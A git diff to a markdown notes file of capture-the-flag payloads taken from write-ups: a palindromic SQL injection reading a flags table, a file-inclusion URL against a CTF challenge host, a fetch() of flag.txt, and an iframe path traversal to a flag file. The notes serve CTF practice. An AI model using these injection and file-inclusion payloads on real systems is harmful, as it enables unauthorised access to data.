@@ -1,7 +1,21 @@
 ### Some payloads from writeups :
 
 - OEPS --> The one line encyclopedia of palindromic sentences :   
-`%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%`
+```js
+%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'%
+```
 
 - File inclusion
-`https://galleria.chal.nbctf.com/gallery?file=/tmp/flag.txt`
+```js
+https://galleria.chal.nbctf.com/gallery?file=/tmp/flag.txt
+```
+
+- Get flag
+```js
+await fetch("flag.txt").then(response=>response.text())
+```
+
+- Leak Directory
+```js
+<iframe src="../../flag.txt" width="1000px" height="1000px"></iframe>
+```
